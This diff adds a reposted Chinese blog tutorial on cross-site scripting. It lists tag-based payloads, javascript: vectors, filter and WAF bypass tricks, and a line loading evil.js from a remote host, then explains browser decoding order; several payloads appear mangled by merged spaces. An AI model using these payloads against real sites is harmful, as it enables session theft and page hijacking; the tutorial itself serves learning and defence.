@@ -1,0 +1,490 @@
+<!DOCTYPE html><html lang="zh-CN" data-dark><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="format-detection" content="telephone=no"><meta name="description" content="前端搬砖大老，写写搬砖那些事儿"><meta name="msvalidate.01" content="0FE4D8B3381D3D87088996B886E1E2BD"><meta name="google-adsense-account" content="ca-pub-8385136408348258"><meta name="keywords" content="前端壹菜鸟, HTML,CSS,JavaScript,ES6+,Sass,Less,Stylus,PostCSS,BEM,TailwindCSS,Bootstrap,React,Vue.js,Angular,Svelte,TypeScript,Vite,Webpack,npm,Yarn,pnpm,Redux,Zustand,Pinia,ReactRouter,VueRouter,ESLint,Prettier,Git,Node.js,ReactNative,Flutter,Electron,Next.js,Nuxt.js,Micro-frontends,WebAssembly,PWA,Three.js,前端,技术博客,转载,FrontEnd"><title>干货 | 学习XSS从入门到熟悉 | 前端壹菜鸟</title><link rel="stylesheet" type="text/css" href="/css/normalize.min.css"><link rel="stylesheet" type="text/css" href="/css/pure-min.min.css"><link rel="stylesheet" type="text/css" href="/css/grids-responsive-min.css"><link rel="stylesheet" type="text/css" href="/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="icon" mask="" sizes="any" href="/img/blog.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/img/blog.ico"><link rel="apple-touch-icon" href="/img/blog.png"><link rel="apple-touch-icon-precomposed" href="/img/blog.png"><script type="text/javascript" src="/js/jquery.min.js"></script><script type="text/javascript" src="/js/isPhone.js"></script><script type="text/javascript" src="/js/fixedPage.jm.js"></script><script type="text/javascript" src="/js/check.js"></script><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8385136408348258"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  document.head.append(bp)
+})();
+</script><script async src="https://jspassport.ssl.qhimg.com/11.0.1.js?d182b3f28525f2db83acfaaf6e696dba"></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-ETCMPGS7S6"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);};gtag('js',new Date());gtag('config','G-ETCMPGS7S6');
+</script><script async src="https://hm.baidu.com/hm.js?011f0b44e8452bfa57fbfa23c5fe7683"></script><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id: 'JkUaixMjOhC8emNs', ck: 'JkUaixMjOhC8emNs', autoTrack:true})
+</script><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "keywords": "HTML,CSS,JavaScript,ES6+,Sass,Less,Stylus,PostCSS,BEM,TailwindCSS,Bootstrap,React,Vue.js,Angular,Svelte,TypeScript,Vite,Webpack,npm,Yarn,pnpm,Redux,Zustand,Pinia,ReactRouter,VueRouter,ESLint,Prettier,Git,Node.js,ReactNative,Flutter,Electron,Next.js,Nuxt.js,Micro-frontends,WebAssembly,PWA,Three.js,前端,技术博客",
+  "description": "前端搬砖大老，写写搬砖那些事儿",
+  "operatingSystem": "Any",
+  "permissions": "browser",
+  "author": {
+    "@type": "Person",
+    "name": "前端壹菜鸟"
+  },
+  "@graph": [{
+    "@type": "WebSite",
+    "name": "前端壹菜鸟",
+    "url": "https://xuehuayu.cn",
+  }, {
+    "@type": "WebSite",
+    "name": "前端壹菜鸟",
+    "url": "https://cainiaoblog.cn",
+  }, ]
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="body_container"><div id="webtraf_17015" style="width:100%;display:flex;justify-content: center;"><script src="https://webtrafic.ru/ads.php?uid=17015" async></script></div><div id="header"><div class="site-name"><a id="logo" href="/.">前端壹菜鸟</a><p class="description">关注前端知识，收集精彩博文，做技术的搬运工</p></div><div id="nav-menu"><a class="current" id="" href="/." target="_self"><i class="fa fa-home"> 首页</i></a><a id="" href="/archives/" target="_self"><i class="fa fa-archive"> 归档</i></a><a id="" href="/guestbook/" target="_self"><i class="fa fa-comments"> 留言</i></a><a id="" href="https://afdian.com/a/big_old/thank" target="_self"><i class="fa fa-group"> 感谢</i></a><a id="" href="/love/" target="_self"><i class="fa fa-heart"> LOVE</i></a><a id="area" href="/area" target="_self" style="display:none;"><i class="fa fa-internet-explorer"> Area</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title c-post">干货 | 学习XSS从入门到熟悉</h1><div class="post-meta"><span class="date">2021-06-04</span><span> | </span><span class="reproduce">转载 </span><span> | </span><span class="category"><a href="/categories/%E5%89%8D%E7%AB%AF/">前端 </a><a href="/categories/FrontEnd/">FrontEnd </a></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 9.9k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-hourglass-half"></i><span class="post-count"> 41</span><span class="post-meta-item-text"> 分钟</span></span></span></div><a class="disqus-comment-count" href="/article/2c1fef23.html#waline-comment"><span class="waline-comment-count" data-path="/article/2c1fef23.html">0</span><span> 条评论</span></a><div class="post-content"><p>XSS，全称Cross Site<br>Scripting，即跨站脚本攻击，是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据攻击代码的工作方式，XSS可以分为反射型的XSS、存储型的XSS和DOM型的XSS。</p>
+<span id="more"></span>
+
+<h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>反射型的XSS是非持久化的，攻击者事先制作好攻击链接，需要欺骗用户自己去点击链接才能触发XSS代码，但是服务器中没有这样的页面和内容，一般容易出现在搜索页面。</p>
+<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>存储型的XSS是持久化的，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行。这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。</p>
+<h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><p>DOM型的XSS是基于文档对象模型Document Objeet<br>Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI<br>，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM<br>XSS漏洞。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p>
+<h2 id="一些常用的标签与属性"><a href="#一些常用的标签与属性" class="headerlink" title="一些常用的标签与属性"></a>一些常用的标签与属性</h2><p>下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。</p>
+<h3 id="scirpt-标签"><a href="#scirpt-标签" class="headerlink" title="scirpt 标签"></a>scirpt 标签</h3><p><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</p>
+<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;
+</code></pre>
+<h3 id="img-标签"><a href="#img-标签" class="headerlink" title="img 标签"></a>img 标签</h3><p><code>&lt;img&gt;</code> 标签定义 HTML 页面中的图像。</p>
+<pre><code>&lt;imgsrc=1onerror=alert(1);&gt;&lt;imgsrc=1onerror=alert(&quot;xss&quot;);&gt;
+</code></pre>
+<h3 id="input-标签"><a href="#input-标签" class="headerlink" title="input 标签"></a>input 标签</h3><p><code>&lt;input&gt;</code> 标签规定了用户可以在其中输入数据的输入字段。</p>
+<p>onfocus 事件在对象获得焦点时发生：</p>
+<pre><code>&lt;inputonfocus=alert(1);&gt;
+</code></pre>
+<p>竞争焦点，从而触发onblur事件：</p>
+<pre><code>&lt;inputonblur=alert(1)autofocus&gt;&lt;inputautofocus&gt;
+</code></pre>
+<p>input 标签的 autofocus 属性规定当页面加载时 <code>&lt;input&gt;</code><br>元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
+<pre><code>&lt;inputonfocus=&quot;alert(1);&quot;autofocus&gt;
+</code></pre>
+<h3 id="details-标签"><a href="#details-标签" class="headerlink" title="details 标签"></a>details 标签</h3><p><code>&lt;details&gt;</code> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭<br><code>&lt;details&gt;</code> 元素时触发：</p>
+<pre><code>&lt;detailsontoggle=alert(1);&gt;
+</code></pre>
+<p>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：</p>
+<pre><code>&lt;detailsopenontoggle=alert(1);&gt;
+</code></pre>
+<h3 id="svg-标签"><a href="#svg-标签" class="headerlink" title="svg 标签"></a>svg 标签</h3><p><code>&lt;svg&gt;</code> 标签用来在HTML页面中直接嵌入SVG 文件的代码。</p>
+<pre><code>&lt;svgonload=alert(1);&gt;
+</code></pre>
+<h3 id="select-标签"><a href="#select-标签" class="headerlink" title="select 标签"></a>select 标签</h3><p><code>&lt;select&gt;</code> 标签用来创建下拉列表。</p>
+<pre><code>&lt;selectonfocus=alert(1)&gt;&lt;/select&gt;
+</code></pre>
+<p>通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
+<pre><code>&lt;selectonfocus=alert(1)autofocus&gt;
+</code></pre>
+<h3 id="iframe-标签"><a href="#iframe-标签" class="headerlink" title="iframe 标签"></a>iframe 标签</h3><p><code>&lt;iframe&gt;</code> 标签会创建包含另外一个文档的内联框架。</p>
+<pre><code>&lt;iframeonload=alert(1);&gt;&lt;/iframe&gt;
+</code></pre>
+<h3 id="video-标签"><a href="#video-标签" class="headerlink" title="video 标签"></a>video 标签</h3><p><code>&lt;video&gt;</code> 标签定义视频，比如电影片段或其他视频流。</p>
+<pre><code>&lt;video&gt;&lt;sourceonerror=alert(1)&gt;
+</code></pre>
+<h3 id="audio-标签"><a href="#audio-标签" class="headerlink" title="audio 标签"></a>audio 标签</h3><p><code>&lt;audio&gt;</code> 标签定义声音，比如音乐或其他音频流。</p>
+<pre><code>&lt;audiosrc=xonerror=alert(1);&gt;
+</code></pre>
+<h3 id="body-标签"><a href="#body-标签" class="headerlink" title="body 标签"></a>body 标签</h3><p><code>&lt;body&gt;</code> 标签定义文档的主体。</p>
+<pre><code>&lt;bodyonload=alert(1);&gt;
+</code></pre>
+<p>onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p>
+<pre><code>&lt;bodyonscroll=alert(1);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
+</code></pre>
+<h3 id="textarea-标签"><a href="#textarea-标签" class="headerlink" title="textarea 标签"></a>textarea 标签</h3><p><code>&lt;textarea&gt;</code> 标签定义一个多行的文本输入控件。</p>
+<pre><code>&lt;textareaonfocus=alert(1);autofocus&gt;
+</code></pre>
+<h3 id="keygen-标签"><a href="#keygen-标签" class="headerlink" title="keygen 标签"></a>keygen 标签</h3><pre><code>&lt;keygenautofocusonfocus=alert(1)&gt; //仅限火狐
+</code></pre>
+<h3 id="marquee-标签"><a href="#marquee-标签" class="headerlink" title="marquee 标签"></a>marquee 标签</h3><pre><code>&lt;marqueeonstart=alert(1)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以
+</code></pre>
+<h3 id="isindex-标签"><a href="#isindex-标签" class="headerlink" title="isindex 标签"></a>isindex 标签</h3><pre><code>&lt;isindextype=imagesrc=1onerror=alert(1)&gt;//仅限于IE
+</code></pre>
+<h2 id="利用-link-远程包含-JavaScript-文件"><a href="#利用-link-远程包含-JavaScript-文件" class="headerlink" title="利用 link 远程包含 JavaScript 文件"></a>利用 link 远程包含 JavaScript 文件</h2><p><code>&lt;link&gt;</code> 标签定义文档与外部资源的关系。在无CSP的情况下才可以使用：</p>
+<pre><code>&lt;linkrel=importhref=&quot;http://47.xxx.xxx.72/evil.js&quot;&gt;
+</code></pre>
+<h2 id="利用-JavaScript-伪协议"><a href="#利用-JavaScript-伪协议" class="headerlink" title="利用 JavaScript 伪协议"></a>利用 JavaScript 伪协议</h2><p><code>javascript:</code><br>这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。当浏览器装载了这样的URL时，并不会转向某个URL，而是执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。</p>
+<h3 id="a-标签"><a href="#a-标签" class="headerlink" title="a 标签"></a>a 标签</h3><pre><code>&lt;ahref=&quot;javascript:alert(1);&quot;&gt;xss&lt;/a&gt;
+</code></pre>
+<h3 id="iframe-标签-1"><a href="#iframe-标签-1" class="headerlink" title="iframe 标签"></a>iframe 标签</h3><pre><code>&lt;iframesrc=javascript:alert(1);&gt;&lt;/iframe&gt;
+</code></pre>
+<h3 id="img-标签-1"><a href="#img-标签-1" class="headerlink" title="img 标签"></a>img 标签</h3><pre><code>&lt;imgsrc=xonerror=alert(1)&gt;&lt;imgsrc=javascript:alert(1)&gt;    //IE7以下
+</code></pre>
+<h3 id="form-标签"><a href="#form-标签" class="headerlink" title="form 标签"></a>form 标签</h3><pre><code>&lt;formaction=&quot;Javascript:alert(1)&quot;&gt;&lt;inputtype=submit&gt;
+</code></pre>
+<h1 id="XSS-常见绕过姿势"><a href="#XSS-常见绕过姿势" class="headerlink" title="XSS 常见绕过姿势"></a>XSS 常见绕过姿势</h1><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicYRgMsNETSpNPc2JiaSIM05Nia0vRJFf6T8Eib1kz8EYpeQibP3fic5VAAzQFicM8srwa7c3ibC0JQiaLyOA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="null"></p>
+<h2 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h2><p>当空格被过滤了时，我们可以用 <code>/</code> 来代替空格：</p>
+<pre><code>&lt;img/src=&quot;x&quot;/onerror=alert(1);&gt;
+</code></pre>
+<p>也可以：</p>
+<pre><code>&lt;img/src=&quot;x&quot;onerror=alert(1);&gt;
+</code></pre>
+<h2 id="绕过引号过滤"><a href="#绕过引号过滤" class="headerlink" title="绕过引号过滤"></a>绕过引号过滤</h2><p>如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：</p>
+<pre><code>&lt;imgsrc=xonerror=alert(`xss`);&gt;
+</code></pre>
+<h2 id="绕过括号过滤"><a href="#绕过括号过滤" class="headerlink" title="绕过括号过滤"></a>绕过括号过滤</h2><p>当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。</p>
+<pre><code>&lt;imgsrc=xonerror=&quot;javascript:window.onerror=alert;throw1&quot;&gt;&lt;aonmouseover=&quot;javascript:window.onerror=alert;throw 1&gt;
+</code></pre>
+<h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><pre><code>&lt;sCRiPt&gt;alert(1);&lt;/sCrIpT&gt;&lt;ImGsRc=xonerRor=alert(1);&gt;
+</code></pre>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p>
+<pre><code>&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;&lt;imimggsrsrcc=xonerror=alert(1);&gt;
+</code></pre>
+<h3 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h3><h4 id="利用eval-函数"><a href="#利用eval-函数" class="headerlink" title="利用eval()函数"></a>利用eval()函数</h4><p>与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。</p>
+<pre><code>&lt;imgsrc=&quot;x&quot;onerror=&quot;a=&#39;aler&#39;;b=&#39;t&#39;;c=&#39;(1)&#39;;eval(a+b+c)&quot;&gt;&lt;imgsrc=&quot;x&quot;onerror=&quot;a=`aler`;b=`t`;c=&#39;(`xss`);&#39;;eval(a+b+c)&quot;&gt;// 在js中，我们可以用反引号代替单双引号
+</code></pre>
+<h4 id="利用top"><a href="#利用top" class="headerlink" title="利用top"></a>利用top</h4><pre><code>&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](&quot;xss&quot;);&lt;/script&gt;
+</code></pre>
+<h2 id="XSS-输出点总结"><a href="#XSS-输出点总结" class="headerlink" title="XSS 输出点总结"></a>XSS 输出点总结</h2><p>WAF最大的问题，在于不知道输出的位置，导致攻击者根据具体环境以及具体输出的标签类型便可以绕过。</p>
+<h3 id="输出在属性里"><a href="#输出在属性里" class="headerlink" title="输出在属性里"></a>输出在属性里</h3><p>例如输出的位置位于value属性中：</p>
+<pre><code>&lt;inputvalue=&quot;[输出]&quot;type=text&gt;
+</code></pre>
+<p>我们可以选择直接闭合标签：</p>
+<pre><code>&quot;&gt;&lt;img src=x onerror=alert(1);&gt;// 输出后如下:// &lt;input value=&quot;&quot;&gt;&lt;img src=x onerror=alert(1);&gt;&quot; type=text&gt;
+</code></pre>
+<p>如果 <code>&lt; &gt;</code> 被过滤的话可以换成选择使用事件来闭合属性，并将后面的引号注释掉或闭合：</p>
+<pre><code>&quot; autofocus onfocus=alert(1)//&quot; autofocus onfocus=alert(1) &quot;// 输出后如下:// &lt;input value=&quot;&quot; autofocus onfocus=alert(1)//&quot; type=text&gt;
+</code></pre>
+<p>同样还有很多其他的payload：</p>
+<pre><code>&quot; onmouseover=prompt(0) x=&quot;&quot; onfocusin=alert(1) autofocus x=&quot;&quot; onfocusout=alert(1) autofocus x=&quot;&quot; onblur=alert(1) autofocus a=&quot;
+</code></pre>
+<p>还有一些特殊的场景，如：</p>
+<pre><code>&lt;inputtype=&quot;hidden&quot;value=&quot;[输出]&quot;/&gt;&lt;inputvalue=&quot;[输出点]&quot;type=&quot;hidden&quot;/&gt;
+</code></pre>
+<p>这里只能把input标签闭合，然后直接执行脚本，否则会因为type为hidden导致无法执行脚本。</p>
+<h3 id="输出在HTML标签之间"><a href="#输出在HTML标签之间" class="headerlink" title="输出在HTML标签之间"></a>输出在HTML标签之间</h3><p>例如输出的位置如下：</p>
+<pre><code>&lt;divid=&quot;body&quot;&gt;[输出]&lt;/div&gt;
+</code></pre>
+<p>直接提交 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 即可触发XSS，但是当标签是不能执行脚本的标签时，如下面这几个：</p>
+<p>•<code>&lt;title&gt;&lt;/title&gt;</code>•<code>&lt;textarea&gt;&lt;/textarea&gt;</code>•<code>&lt;xmp&gt;&lt;/xmp&gt;</code>•<code>&lt;iframe&gt;&lt;/iframe&gt;</code></p>
+<p>那么就得先把那个标签闭合（后文会讲到原理），然后在注入XSS语句，例如：</p>
+<pre><code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<h3 id="输出在script标签之间"><a href="#输出在script标签之间" class="headerlink" title="输出在script标签之间"></a>输出在script标签之间</h3><p>例如：</p>
+<pre><code>&lt;script&gt;var x =&quot;input&quot;;&lt;/script&gt;
+</code></pre>
+<p>可控位置在input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了：</p>
+<pre><code>&quot;;alert(1)//// 输出后如下:// &lt;script&gt;var x = &quot;&quot;;alert(1)//&quot;;&lt;/script&gt;
+</code></pre>
+<h1 id="XSS-字符编码绕过"><a href="#XSS-字符编码绕过" class="headerlink" title="XSS 字符编码绕过"></a>XSS 字符编码绕过</h1><p>在XSS中，还有一个绕过关键字过滤的方法，那就是字符编码绕过。这里给出一个编码网站：<a target="_blank" rel="noopener" href="https://bianma.bmcx.com/">https://bianma.bmcx.com/</a></p>
+<p>编码属于计算机系统的基础知识，其内容写起来估计也可以出本书了，不过或多或少我们都有所了解，总的来说，编码就是将字符变为二进制数，而解码就是将二进制数还原为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程，下面大概介绍一下流程。</p>
+<h2 id="请求网页解码流程"><a href="#请求网页解码流程" class="headerlink" title="请求网页解码流程"></a>请求网页解码流程</h2><p>•<strong>HTML 编码&#x2F;解码</strong></p>
+<p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码。</p>
+<p>但是在HTML中有些字符是和关键词冲突的，比如<br><code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，解码之后，浏览器会误认为它们是HTML标签，如果希望正确地显示预留字符，就需要在HTML中使用对应的HTML字符实体。</p>
+<p>字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开头，后面跟着一个预定义的实体的名称，或用&amp;#开头+实体编号+分号来表示。</p>
+<p>常见的HTML字符实体有：<br>显示结果描述实体名称实体编号<br>空格<code>&amp;nbsp;``&amp;#160;</code>&lt;小于号<code>&amp;lt;``&amp;#60;</code>&gt;大于号<code>&amp;gt;``&amp;#62;</code>&amp;和号<code>&amp;amp;``&amp;#38;</code>“引号<code>&amp;quot;``&amp;#34;</code>‘撇号<code>&amp;apos;</code>(IE不支持)<code>&amp;#39;</code><br>但并不是所有的字符都有实体名称，但是它们都有自己的实体编号。</p>
+<p>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个 <code>&lt;</code> 符号（后面没有跟<br><code>/</code>符号）就会进入 <strong>标签开始状态(Tag open state)</strong> ，然后转变到 <strong>标签名状态(Tag name state)</strong> 、<br><strong>前属性名状态(before attribute name state)</strong> ……最后进入 <strong>数据状态(Data state)</strong><br>并释放当前标签的token。当解析器处于 数据状态(Data state) 时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p>
+<p>简单的说就是，浏览器对HTML解码之后就开始解析HTML文档，将众多标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。</p>
+<p>所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。</p>
+<p>•<strong>URL 解码</strong></p>
+<p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p>
+<p>在服务端接收到请求时，会自动对请求进行一次URL解码。</p>
+<p>•<strong>JavaScript 解码（只支持Unicode）</strong></p>
+<p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code><br>这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的 javascript 伪URL，也会进入<br>JavaScript 的解析模式。</p>
+<p>比如 <code>&lt;a href=&quot;javascript:alert(&#39;\u0031&#39;)&quot;&gt;test&lt;/a&gt;</code>，JavaScript 出发了 JavaScript<br>解释器，JavaScript 会先对内容进行解析，里边有一个转义字符<code>\u0031</code>，前导的 u 表示他是一个unicode<br>字符，根据后边的数字，解析为“1”，于是在完成 JavaScript 的解析之后变成了 <code>&lt;a href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;test&lt;/a&gt;</code>。</p>
+<p><strong>下面用一个普通的XSS代码来说明一下浏览器对其解析的过程。</strong></p>
+<p>•<code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;test&lt;/a&gt;</code></p>
+<p>首先HTML解析器开始工作，并对href中的字符做HTML解码，接下来URL解析器对href值进行解码，正常情况下URL值为一个正常的URL链接，如：<code>https://www.baidu.com</code>，那么URL解析器工作完成后是不需要其他解码的，但是该环境中URL资源类型为Javascript，因此该环境中最后一步Javascript解析器还会进行解码操作，最后解析的脚本将被执行。</p>
+<p>整个解析顺序为3个环节：HTML解码 —&gt;URL解码 —&gt;JS解码</p>
+<p>我们可以对XSS攻击向量做这三种编码都可以成功弹框。</p>
+<h2 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码"></a>HTML 实体编码</h2><p>我们可以将DOM节点中的内容转化为HTML实体，因为解析HTML之后建立起节点，然后会对DOM节点里面的HTML实体进行解析。HTML<br>编码主要分为10进制和16进制，格式为以 <code>&amp;#</code> 开头以分号 <code>;</code> 结尾（也可以不带分号）。</p>
+<p>•<code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></p>
+<pre><code>// 十进制&lt;ahref=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;// 十六进制&lt;ahref=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;// 也可以不带分号&lt;ahref=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;
+</code></pre>
+<p>•<code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></p>
+<pre><code>// 十进制&lt;imgsrc=xonerror=alert(&quot;xss&quot;)&gt;// 十六进制&lt;imgsrc=xonerror=alert(&quot;xss&quot;)&gt;// 也可以不带分号&lt;imgsrc=xonerror=alert(&quot;xss&quot;)&gt;
+</code></pre>
+<p>但是要注意，对于HTML字符实体，并不是说任何地方都可以使用实体编码，只有处于 “数据状态中的字符引用”、“属性值状态中的字符引用” 和<br>“RCDATA状态中的字符引用” 这三种状态中的HTML字符实体将会从 <code>&amp;#…</code> 形式解码，转化成对应的解码字符并被放入数据缓冲区中。</p>
+<p>**（1）数据状态中的字符引用：**数据状态就是解析一个标签内里面的内容，如 <code>&lt;div&gt;...&lt;/div&gt;</code> 中的内容，当浏览器解析完 <code>&lt;div&gt;</code><br>标签之后如果发现标签内还含有实体字符的话，就会有一个实体编码解析了，如：</p>
+<pre><code>&lt;div&gt;&lt;imgsrc=xonerror=alert(&quot;xss&quot;)&gt;&lt;/div&gt;
+</code></pre>
+<p>如下图，此时在页面上显示的是经过转义的内容：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210202191314434</p>
+<p>这看上去是一个标准的标签语言，但并不会触发xss，因为当前HTML解析器处于“数据状态”，不会转换到“标签开始状态”，所以就不会建立新的标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成“数据”而不是XSS攻击向量。</p>
+<p>**（2）属性值状态中的字符引用：**属性值状态中的字符引用就好理解了，就是src，herf这样的属性值中的HTML实体，他也是会先进行HTML解码的，比如下面的语句，会先对里面HTML解码，然后再继续往下执行：</p>
+<pre><code>&lt;ahref=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;
+</code></pre>
+<p>**（3）RCDATA状态中的字符引用：**然后再来看一下什么是RCDATA转态，这里需要我们先了解一下HTML中有五类元素：</p>
